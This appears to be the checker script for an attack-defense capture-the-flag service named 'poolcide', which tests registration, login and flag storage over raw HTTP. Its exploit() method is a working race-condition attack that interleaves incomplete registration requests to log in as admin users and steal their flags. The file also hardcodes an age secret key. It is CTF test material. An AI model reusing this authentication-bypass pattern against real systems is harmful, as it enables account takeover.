#!/usr/bin/env python3
import html
import random
import secrets
import string
import subprocess
import urllib.parse

from enochecker import BaseChecker, run
from enochecker.utils import *

# created: 2020-06-25T23:34:03+02:00
AGE_PUBLIC_KEY = "age1mngxnym3sz9t8jtyfsl43szh4pg070g857khq6zpw3h9l37v3gdqs2nrlx"
AGE_SECRET_KEY = (
    "AGE-SECRET-KEY-1XCKQZWRQ6AH3MUZGHH29M37CF2CAC5U4TLZA9WRSTHNG9UH02LSS8FNDUY"
)

AGE_KEYFILE = "./age_key"

COOKIE = "poolcode"

with open("users.txt") as f:
    # users must not include '=', or '&' chars
    users = [x.strip() for x in f.readlines()]

assert len(users) > 100


# noinspection PyDefaultArgument
def build_http(
    route: str = "/cgi-bin/poolcide",
    method: str = "GET",
    params: Dict[str, str] = {},
    query_params: Dict[str, str] = {},
    body_params: Dict[str, str] = {},
    cookies: Dict[str, str] = {},
) -> str:
    """
    anything passed in params parameter goes either to query or body,
    Builds a http request, with shuffled get, body, and cookie, positions.
    """
    query_params = query_params.copy()
    body_params = body_params.copy()

    for key, val in params.items():
        if secrets.randbelow(2) == 0:
            query_params[key] = val
        else:
            body_params[key] = val

    shuffled_gets = list(query_params.keys())
    random.shuffle(shuffled_gets)
    shuffled_body = list(body_params.keys())
    random.shuffle(shuffled_body)
    gets = "&".join([f"{x}={query_params[x]}" for x in shuffled_gets])

    body = ""
    for body_key in shuffled_body:
        body_val = body_params[body_key]
        if body == "":
            # Initial val, no need to divide
            body = f"{body_key}={body_val}"
        elif secrets.randbelow(2) == 0:
            # divide with &
            body = f"{body}&{body_key}={body_val}"
        else:
            # divide with \n
            body = f"{body}\n{body_key}={body_val}"

    # Make sure to always end params on \n - else the connection may block (params are read line by line)
    if body != "":
        body += "\n"

    shuffled_cookies = list(cookies.keys())
    if len(shuffled_cookies):
        random.shuffle(shuffled_cookies)
        cookie_str = "Cookie: " + ";".join([f"{x}={cookies[x]}" for x in cookies])
    else:
        cookie_str = ""

    req = (
        f"{method.upper()} {route}?{gets} HTTP/1.0\r\n"
        f"{cookie_str}\r\n\r\n"
        f"{body}"
    )
    return req


class PoolcideChecker(BaseChecker):
    port = 9001
    flag_count = 1
    noise_count = 2
    havoc_count = 1

    def random_string(self, len) -> str:
        return "".join(secrets.choice(string.ascii_letters) for x in range(len))

    def random_user(self) -> str:
        return secrets.choice(users) + hex(secrets.randbelow(12000))[2:]

    def random_password(self) -> str:
        return self.random_string(16)

    def parse_cookie(self, response: Union[bytes, str]) -> str:
        response = ensure_unicode(response)
        try:
            cookie = (
                response.split("Set-Cookie:")[1].split(f"{COOKIE}=")[1].split(";")[0]
            )
        except Exception as ex:
            self.warning(f"Cookie not found in resp: <<{response}>>: {ex}")
            raise BrokenServiceException("Could not read cookie")
        return cookie

    def user_request(
        self, route: str, cookie: str, csrf: str, username: str, password: str
    ) -> Tuple[str, str, str]:
        """
        return: Tuple(response, cookie, csrf)
        """
        self.info(f"Executing {route} as user {username} with password {password}")
        with self.connect(retries=8) as t:
            http = build_http(
                method="POST",
                query_params={"route": route},
                cookies={COOKIE: cookie},
                body_params={"username": username, "password": password, "csrf": csrf},
            )
            self.debug(f"Sending request: {http[40:]}...")
            t.write(http)
            resp = ensure_unicode(t.read_until("</body>"))
            self.debug(f"Got response: {resp[-40:]}...")
            new_cookie = self.parse_cookie(resp)

            assert_equals(cookie, new_cookie)

            if "success" not in resp:
                self.error(f"No success response, instead got {resp}")
                raise BrokenServiceException("Login failed")
            self.info(f"Got cookie {cookie}")
            return resp, cookie, csrf

    def login(
        self, username: str, password: str, cookies: Dict[str, str] = {}
    ) -> Tuple[str, str, str]:
        resp, cookie, csrf = self.request_index(cookies)
        self.info("trying to log in")
        return self.user_request("login", cookie, csrf, username, password)

    def register(
        self, username: str, password: str, cookies: Dict[str, str] = {}
    ) -> Tuple[str, str, str]:
        resp, cookie, csrf = self.request_index(cookies)
        self.info("trying to register")
        return self.user_request("register", cookie, csrf, username, password)

    def reserve(self, cookie: str, as_admin: bool) -> None:
        color_string = urllib.parse.quote(self.flag)
        with self.connect(retries=8) as t:
            http = build_http(
                method="GET",
                query_params={"route": "dispense"},
                cookies={COOKIE: cookie},
            )
            self.debug(f"request for dispense: ...{http[-40:]}")
            t.write(http)
            resp = ensure_unicode(t.read_until("</body>"))
            self.debug(f"response for dispense was ...{resp[-40:]}")

        try:
            csrf = resp.split('name="csrf" value="')[1].split('"')[0]
        except Exception as ex:
            self.warning(f"Could not read csrf token: {ex}")
            raise BrokenServiceException("No csrf token found in route=dispense")

        # POST has a special handling, waiting for the admin key in the body.
        method = "POST" if as_admin else "GET"
        with self.connect(retries=8) as t:
            http = build_http(
                method=method,
                query_params={"route": "reserve"},
                params={"color": color_string, "csrf": csrf},
                cookies={COOKIE: cookie},
            )
            t.write(http)
            stuff = t.read_until("<code>")
            if b"admin" not in stuff:
                self.warning(f"Expected to find 'admin' in '{stuff}'")
                raise BrokenServiceException(f"No valid answer from reserve {method}")

            content = t.read_until("</body>")
            content = content.decode()[:-1]

            try:
                self.debug(f"reserve page content is ...{content[-40:]}")
                towel_id = content.split("<p>Your towel with the ID ")[1].split(" and")[0]
                self.info(f"Got towel id {towel_id}")
                # Storing towel_token
                self.team_db[self.flag + "_towel"] = towel_id
            except Exception as ex:
                self.warning("Towel ID Failed with request {content}: {ex}")
                raise BrokenServiceException("Could not get Towel ID")

            if not as_admin:
                return

            age_begin = "-----BEGIN AGE ENCRYPTED FILE-----"
            age_end = "-----END AGE ENCRYPTED FILE-----"
            age_line_len = 64
            try:
                line = content.split(age_begin)[1].split(age_end)[0]
            except Exception as ex:
                self.warning(f"Looked for admin token but only got {content}: {ex}")
                raise BrokenServiceException("Admin token not found")
            n = age_line_len
            age_lines = [line[i : i + n] for i in range(0, len(line), n)]
            age = age_begin + "\n" + "\n".join(age_lines) + "\n" + age_end
            resp = subprocess.run(
                ["./age", "-d", "-i", AGE_KEYFILE],
                input=age.encode(),
                capture_output=True,
            )
            admin_id = resp.stdout.strip()
            if len(admin_id) != 16:
                self.warning(f"Got {admin_id} (stderr {resp.stderr}) from ./age")
                raise BrokenServiceException("No valid Admin ID could be found")
            t.write(b"towel_admin_id=")
            t.write(admin_id)
            t.write("\n")
            all = t.read_until("</body>")
            if not b"Admin at the pool" in all:
                self.warning(f"Didn't find admin info in {all}")
                raise BrokenServiceException(
                    "Could not Administer Towels at the Poolcide."
                )

    def get_towel(self, cookie: str, towel_token: str):
        with self.connect(retries=8) as t:
            self.debug(
                f"Getting flag with towel_token {towel_token.strip()} and cookie {cookie}"
            )
            t.write(
                f"GET /cgi-bin/poolcide/poolcide?route=towel&token={towel_token.strip()}\r\nCookie: {COOKIE}={cookie}\r\n\r\n"
            )
            resp = t.read_until("</body>")
            self.debug(f"Got return {resp[40]}...")
            return resp.decode()

    def putflag(self) -> None:
        user = self.random_user()
        password = self.random_password()
        self.team_db[self.flag] = {"user": user, "password": password}
        self.info(f"Random username: {user}, random password {password}")
        resp, cookie, csrf = self.register(user, password)
        self.info(f"Registered as {user}")

        self.reserve(cookie, as_admin=True)

    def getflag(self) -> None:
        try:
            user = self.team_db[self.flag]["user"]
            password = self.team_db[self.flag]["password"]
            towel_token = self.team_db[self.flag + "_towel"]
        except Exception as ex:
            self.error(f"Could not get flag user, password or towlid from db: {ex}")
            raise BrokenServiceException(
                "No stored credentials from putflag in getflag"
            )

        resp, cookie, csrf = self.login(user, password)
        admin_list = self.get_admin_list({COOKIE: cookie})
        if not len(admin_list):
            raise BrokenServiceException("No privileged towels found.")
        if towel_token not in [y for (x, y) in admin_list]:
            raise BrokenServiceException("Flag towel not listed in dispense route")
        resp = self.get_towel(cookie, towel_token)
        try:
            escaped_flag = resp.split('id="color">')[1].split("</code>")[0]
            self.info(f"Escaped flag is {escaped_flag}")
            # Flags get url escaped on request by the browser - and html escaped by us.
            flag = urllib.parse.unquote(html.unescape(escaped_flag))
        except Exception as ex:
            self.error(f"Error while extracting flag from response: {resp}")
            raise BrokenServiceException("Could not get back any flag")
        if flag != self.flag:
            self.error(f"Expected flag {self.flag} but got {flag}!")
            raise BrokenServiceException("Did not get back the valid flag.")

    # noinspection PyDefaultArgument
    def request_index(self, cookies={}):
        req = build_http(query_params={"route": "index"}, cookies=cookies)
        with self.connect(retries=8) as sock:
            sock.write(req)
            indexresp = ensure_unicode(sock.read_until("</body>"))
        # find <input type="hidden" id="csrf" name="csrf" value="7XT3cepo" />
        try:
            csrf = indexresp.split('name="csrf" value="')[1].split('" />')[0]
            self.info(f"Got csrf token {csrf}")
        except Exception as ex:
            self.warning("Could not find csrf token", exc_info=ex)
            raise BrokenServiceException("csrf token could not be found!")
        cookie = self.parse_cookie(indexresp)
        return indexresp, cookie, csrf

    def putnoise(self) -> None:
        user = self.random_user()
        password = self.random_password()
        self.info(f"Random username: {user}, random password {password}")
        resp, cookie, csrf = self.register(user, password)
        self.info(f"Registered as {user}")

        self.team_db[self.flag] = {"user": user, "password": password, "cookie": cookie}

        self.reserve(cookie, as_admin=False)

    def getnoise(self) -> None:
        try:
            flag_obj = self.team_db[self.flag]
            user = flag_obj["user"]
            password = flag_obj["password"]
            cookie = flag_obj["cookie"]
            towel_token = self.team_db[self.flag + "_towel"]
        except Exception as ex:
            self.error(f"Could not get noise user, password or towel_token from db: {ex}")
            raise BrokenServiceException(
                "No stored credentials from putnoise in getnoise"
            )

        if self.flag_idx % 2:
            cookies = {COOKIE: cookie, self.random_string(4): self.random_string(4)}
            resp, cookie, csrf = self.request_index(cookies)
            assert_equals(cookie, cookies[COOKIE])
        else:
            # do a fresh login.
            resp, cookie, csrf = self.login(user, password)

        admin_list = self.get_admin_list({COOKIE: cookie})
        if not len(admin_list):
            raise BrokenServiceException("No privileged towels found.")
        self.info(f"AdminCount: {len(admin_list)}")

        resp = self.get_towel(cookie, towel_token)
        try:
            escaped_flag = resp.split('id="color">')[1].split("</code>")[0]
            self.info(f"Escaped flag is {escaped_flag}")
            # Flags get url escaped on request by the browser - and html escaped by us.
            flag = urllib.parse.unquote(html.unescape(escaped_flag))
        except Exception as ex:
            self.error(f"Error while extracting flag from response: {resp}")
            raise BrokenServiceException("Could not get back any flag")
        if flag != self.flag:
            self.error(f"Expected flag {self.flag} but got {flag}!")
            raise BrokenServiceException("Did not get back the valid flag.")

    def havoc(self) -> None:
        branch = secrets.randbelow(1)
        if branch == 1:
            resp = self.http_get("cgi-bin/")
            assert_in("FORBIDDEN", resp.text, "Diret access to cgi-bin not FORBIDDEN")

    def get_admin_list(self, cookies: Dict[str, str]) -> List[Tuple[str, str]]:
        """
        Parses the towels fom dispense and gets the admin towels
        :param cookies: The cookies. Must at least include a valid poolcode for this method to work.
        :return: List[(name, towel_id)]
        """
        if COOKIE not in cookies:
            raise AttributeError(f"Cookie {COOKIE} needs to be set to get admin list")

        with self.connect(retries=8) as t:
            http = build_http(
                method="GET", query_params={"route": "dispense"}, cookies=cookies,
            )
            self.debug(f"request for dispense: ...{http[-40:]}")
            t.write(http)
            resp = ensure_unicode(t.read_until("</body>"))

        self.debug(f"response for dispense was {resp[40:]}...{resp[-40:]}")

        # print(resp)

        try:
            adminslist = [
                (x.split("// ")[1].split("</a></li>")[0], x.split("</strong> ")[0])
                for x in resp.split("<strong>")[1:]
            ]
        except Exception as ex:
            raise BrokenServiceException("Could not parse towellist")
        return adminslist

    def exploit(self) -> None:
        self.info("Step 1: get all available admin ids")
        resp, cookie, csrf = self.register(self.random_user(), self.random_password())
        admin_list = self.get_admin_list({COOKIE: cookie})
        self.info(f"admins: {admin_list}")

        found_flags = []
        failed = []

        for (admin_name, towel_id) in admin_list:
            try:
                self.info(
                    f"Step 2: Start logging in as admin user with name {admin_name}"
                )
                resp, cookie, csrf = self.request_index()

                self.info("Step 3: Start registering a user - but without password")
                resp, cookie, csrf = self.request_index(cookies={COOKIE: cookie})

                self.debug(f"Cookie is {cookie}")

                sock_reg = self.connect(retries=8)

                http_reg = build_http(
                    method="POST",
                    query_params={"route": "register"},
                    cookies={COOKIE: cookie},
                    body_params={
                        "username": f"ATTACKER{self.random_user()}",
                        "csrf": csrf,
                    },
                )

                # Write some dummy data to make sure our stuff got sent
                sock_reg.write(http_reg)
                time.sleep(0.007)
                sock_reg.write("\n\n\n\n\n")
                time.sleep(0.007)
                sock_reg.read_eager()

                self.info(
                    "Step 4: Start registering the admin user (don't send the password) to set username"
                )

                sock_admin = self.connect(retries=8)
                resp, cookie, csrf = self.request_index(cookies={COOKIE: cookie})

                http_admin = build_http(
                    method="POST",
                    query_params={"route": "register"},
                    cookies={COOKIE: cookie},
                    body_params={"username": admin_name, "csrf": csrf},
                )
                sock_admin.write(http_admin)

                time.sleep(0.007)
                sock_admin.write("\n\n\n\n\n")
                time.sleep(0.007)
                sock_admin.read_eager()

                self.debug("step 5: finish register to set logged_in to 1")
                sock_reg.write(f"password={self.random_password()}\n")
                self.debug("Register complete. Should be logged in now.")
                self.debug(f"Register response: {sock_reg.read_until('</body>')}")
                sock_reg.close()
                self.info(
                    "Now we should be logged in with the admin username. Get the towel!"
                )

                self.info(f"Final step - we are logged in as admin, read the flag.")
                get_flag = build_http(
                    method="POST",
                    query_params={"route": "towel", "token": towel_id},
                    cookies={COOKIE: cookie},
                )
                sock_flag = self.connect(retries=8)
                sock_flag.write(get_flag)
                flag_response = ensure_unicode(sock_flag.read_until("</body>"))
                self.debug(f"Flag response: {flag_response}")

                flag_enc = flag_response.split('id="color">')[1].split("</code>")[0]
                flag = urllib.parse.unquote(html.unescape(flag_enc))
                self.warning(f"Found FLAG: {flag}")
                found_flags.append(flag)

                sock_reg.close()
                sock_admin.close()
                sock_flag.close()
            except Exception as ex:
                self.error(
                    f"Could not get flag with towel_id {towel_id} for user {admin_name}: {ex}"
                )
                failed.append(admin_name)

        self.info(f"Got {len(found_flags)} flags and failed for {len(failed)}")


app = PoolcideChecker.service

if __name__ == "__main__":
    run(PoolcideChecker)
